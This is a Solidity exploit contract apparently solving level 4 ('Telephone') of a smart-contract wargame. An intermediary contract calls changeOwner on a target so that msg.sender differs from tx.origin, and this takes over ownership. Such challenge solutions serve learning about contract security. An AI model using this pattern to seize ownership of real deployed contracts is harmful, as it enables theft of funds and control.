// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

// ================================================================
// │                      LEVEL 4 - TELEPHONE                     │
// ================================================================
contract TelephoneMiddleman {
    function run(address _targetContractAddress) public {
        ITelephone(_targetContractAddress).changeOwner(msg.sender);
    }
}
